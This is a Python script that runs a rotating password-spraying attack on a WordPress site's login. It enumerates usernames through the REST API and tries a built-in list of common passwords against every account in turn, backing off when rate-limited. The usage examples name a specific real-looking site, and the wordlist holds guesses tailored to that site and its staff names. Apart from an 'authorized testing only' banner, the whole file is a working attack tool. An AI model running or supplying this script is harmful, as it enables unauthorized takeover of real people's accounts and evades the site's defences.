#!/usr/bin/env python3
"""
Multi-User Rotating Brute-Force — Tests all discovered usernames

Strategy: For each password, try it against ALL users before moving to
the next password. This spreads attempts across accounts and avoids
per-user rate limiting.

  Round 1: password123 → tadmin, heather, starhalex, krystaljean, ...
  Round 2: 123456     → tadmin, heather, starhalex, krystaljean, ...
  Round 3: qwerty     → tadmin, heather, starhalex, krystaljean, ...

Rate: 5 requests/sec (configurable) = each user sees ~0.7 attempts/sec

Usage:
    python3 multi_user_bruteforce.py --url https://www.starregistry.com
    python3 multi_user_bruteforce.py --url https://www.starregistry.com --rate 5 --top 1000
    python3 multi_user_bruteforce.py --url https://www.starregistry.com --wordlist rockyou.txt --top 500
"""

import argparse
import sys
import time
import requests
from urllib.parse import urljoin

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Top 200 most common passwords (from rockyou.txt + common lists)
TOP_PASSWORDS = [
    "123456", "12345", "123456789", "password", "iloveyou",
    "princess", "1234567", "rockyou", "12345678", "abc123",
    "nicole", "daniel", "babygirl", "monkey", "lovely",
    "jessica", "654321", "michael", "ashley", "qwerty",
    "111111", "iloveu", "000000", "michelle", "tigger",
    "sunshine", "chocolate", "password1", "soccer", "anthony",
    "friends", "butterfly", "purple", "angel", "jordan",
    "liverpool", "justin", "loveme", "fuckyou", "123123",
    "football", "secret", "andrea", "carlos", "jennifer",
    "joshua", "bubbles", "1234567890", "superman", "hannah",
    "amanda", "loveyou", "pretty", "basketball", "andrew",
    "angels", "tweety", "flower", "playboy", "hello",
    "elizabeth", "hottie", "tinkerbell", "charlie", "samantha",
    "barbie", "chelsea", "lovers", "teamo", "jasmine",
    "brandon", "666666", "shadow", "melissa", "eminem",
    "matthew", "robert", "danielle", "forever", "family",
    "jonathan", "987654321", "computer", "whatever", "dragon",
    "vanessa", "cookie", "naruto", "summer", "sweety",
    "spongebob", "joseph", "junior", "sophia", "kevin",
    "nicholas", "mercedes", "sexy", "princess1", "pimpin",
    "gangsta", "babyboy", "hotdog", "master", "william",
    "thomas", "george", "fuckyou1", "patrick", "star",
    "buster", "midnight", "trustno1", "welcome", "welcome1",
    "letmein", "admin", "admin123", "admin1", "password123",
    "pass", "pass123", "1234", "12345a", "123abc",
    "qwerty123", "q1w2e3r4", "1q2w3e4r", "1qaz2wsx", "zaq12wsx",
    "changeme", "test", "test123", "root", "toor",
    "administrator", "manager", "supervisor", "p@ssw0rd", "passw0rd",
    "starregistry", "star123", "starAdmin", "registry", "stars",
    "starname", "buyastar", "namestar", "stargift", "star2026",
    "Star123!", "Registry1", "admin2026", "wordpress", "wp-admin",
    "heather", "heather1", "heather123", "kathy", "kathy123",
    "gemma", "gemma123", "fernando", "krystal", "krystal123",
    "company", "company1", "office", "office123", "work",
]


def enumerate_users(base_url):
    """Discover all usernames via REST API"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 1: DISCOVERING ALL USERS ═══{RESET}\n")
    users_url = urljoin(base_url, "/wp-json/wp/v2/users")

    try:
        resp = requests.get(users_url, timeout=10)
        if resp.status_code == 200:
            users = resp.json()
            if isinstance(users, list) and len(users) > 0:
                usernames = []
                for u in users:
                    uid = u.get("id", "?")
                    slug = u.get("slug", "?")
                    name = u.get("name", "?")
                    role = "ADMIN" if uid == 1 else "Staff"
                    color = RED if uid == 1 else YELLOW
                    print(f"    {color}[{role:>5}] {slug:<20} ({name}){RESET}")
                    usernames.append(slug)
                print(f"\n  {GREEN}Found {len(usernames)} accounts to test{RESET}")
                return usernames
        print(f"  {RED}Could not enumerate users{RESET}")
        return []
    except requests.RequestException as e:
        print(f"  {RED}Error: {e}{RESET}")
        return []


def rotating_bruteforce(base_url, usernames, passwords, rate_per_sec):
    """Try each password against all users before moving to next password"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 2: ROTATING BRUTE-FORCE ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    total_attempts = len(passwords) * len(usernames)
    delay = 1.0 / rate_per_sec

    print(f"  Target:     {login_url}")
    print(f"  Users:      {len(usernames)} ({', '.join(usernames)})")
    print(f"  Passwords:  {len(passwords)}")
    print(f"  Total:      {total_attempts:,} attempts")
    print(f"  Rate:       {rate_per_sec}/sec ({delay*1000:.0f}ms between requests)")
    print(f"  Per user:   ~{rate_per_sec/len(usernames):.1f} attempts/sec")
    est_min = total_attempts / rate_per_sec / 60
    print(f"  Estimate:   ~{est_min:.0f} minutes")
    print()

    # Create persistent session
    session = requests.Session()
    session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=1, pool_maxsize=1,
        max_retries=requests.adapters.Retry(total=2, backoff_factor=0.5)
    )
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    # Warm up
    try:
        session.get(login_url, timeout=10)
    except requests.RequestException:
        pass

    found = {}  # username -> password
    attempt = 0
    errors = 0
    blocked_count = 0
    start_time = time.time()

    for pw_idx, password in enumerate(passwords):
        for username in usernames:
            attempt += 1
            elapsed = time.time() - start_time
            rate = attempt / elapsed if elapsed > 0 else 0
            remaining = (total_attempts - attempt) / rate if rate > 0 else 0
            mins_left = int(remaining / 60)

            # Progress line
            print(f"\r  [{attempt:>6,}/{total_attempts:,}] "
                  f"pw#{pw_idx+1:>4} {password:<20} → {username:<16} "
                  f"| {rate:.1f}/s | ~{mins_left}m left "
                  f"| found: {len(found)}",
                  end="")
            sys.stdout.flush()

            try:
                resp = session.post(login_url, data={
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": urljoin(base_url, "/wp-admin/"),
                    "testcookie": "1"
                }, allow_redirects=False, timeout=15)

                if resp.status_code == 302:
                    location = resp.headers.get("Location", "")
                    if "wp-admin" in location:
                        found[username] = password
                        print(f"\n\n  {RED}{BOLD}[!!!] CRACKED: {username} / {password}{RESET}\n")

                elif resp.status_code == 429:
                    blocked_count += 1
                    if blocked_count >= 3:
                        print(f"\n\n  {YELLOW}[RATE LIMITED]{RESET} HTTP 429 — "
                              f"slowing down (blocked {blocked_count}x)...")
                        time.sleep(30)  # Wait 30 seconds
                        blocked_count = 0
                    else:
                        time.sleep(5)  # Brief pause

                elif resp.status_code == 403:
                    blocked_count += 1
                    if blocked_count >= 5:
                        print(f"\n\n  {RED}[BLOCKED]{RESET} HTTP 403 — IP blocked after {attempt} attempts")
                        break
                    time.sleep(10)

            except requests.RequestException:
                errors += 1
                time.sleep(1)  # Brief pause on error

            # Rate limiting
            time.sleep(delay)

        # Check if we got blocked out of the inner loop
        if blocked_count >= 5:
            break

    elapsed = time.time() - start_time

    # Results
    print(f"\n\n{BOLD}{'='*62}{RESET}")
    print(f"{BOLD}  MULTI-USER BRUTE-FORCE RESULTS{RESET}")
    print(f"{BOLD}{'='*62}{RESET}\n")

    print(f"  Attempts:  {attempt:,}")
    print(f"  Time:      {int(elapsed)}s ({elapsed/60:.1f} minutes)")
    print(f"  Rate:      {attempt/elapsed:.1f} req/s")
    print(f"  Errors:    {errors}")
    print(f"  Blocked:   {blocked_count} times")
    print()

    if found:
        print(f"  {RED}{BOLD}CREDENTIALS FOUND:{RESET}\n")
        for user, pw in found.items():
            print(f"    {RED}{BOLD}{user:<20} : {pw}{RESET}")
        print(f"\n  {RED}These accounts are compromised. Change passwords immediately.{RESET}")
    else:
        print(f"  {GREEN}No passwords cracked from this wordlist.{RESET}")
        print(f"  The vulnerability (no rate limiting) still exists —")
        print(f"  these passwords just weren't in the list.")

    print(f"\n  {BOLD}Accounts tested:{RESET}")
    for u in usernames:
        status = f"{RED}CRACKED: {found[u]}{RESET}" if u in found else f"{GREEN}not cracked{RESET}"
        print(f"    {u:<20} — {status}")

    print()
    return found


def main():
    parser = argparse.ArgumentParser(
        description="Multi-user rotating brute-force tester"
    )
    parser.add_argument("--url", default="http://localhost:8080",
                        help="Target WordPress URL")
    parser.add_argument("--rate", type=float, default=5,
                        help="Requests per second (default: 5)")
    parser.add_argument("--top", type=int, default=200,
                        help="Number of top passwords to try (default: 200)")
    parser.add_argument("--wordlist", default=None,
                        help="Custom wordlist file (overrides built-in list)")
    args = parser.parse_args()

    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗
║    MULTI-USER ROTATING BRUTE-FORCE — ALL ACCOUNTS TEST     ║
║                                                            ║
║  Tests ALL discovered users with top passwords, rotating   ║
║  through accounts to avoid per-user rate limiting          ║
║                                                            ║
║  ⚠  FOR AUTHORIZED TESTING ONLY                            ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

    base_url = args.url.rstrip("/")

    # Phase 1: Get all usernames
    usernames = enumerate_users(base_url)
    if not usernames:
        print(f"  {RED}No users found. Cannot proceed.{RESET}")
        return

    # Load passwords
    if args.wordlist:
        try:
            with open(args.wordlist, encoding="latin-1") as f:
                passwords = [line.strip() for line in f if line.strip()]
            passwords = passwords[:args.top]
            print(f"\n  Loaded top {len(passwords)} passwords from {args.wordlist}")
        except FileNotFoundError:
            print(f"  {RED}Wordlist not found, using built-in list{RESET}")
            passwords = TOP_PASSWORDS[:args.top]
    else:
        passwords = TOP_PASSWORDS[:args.top]
        print(f"\n  Using built-in top {len(passwords)} passwords")

    # Phase 2: Rotating brute-force
    found = rotating_bruteforce(base_url, usernames, passwords, args.rate)


if __name__ == "__main__":
    main()
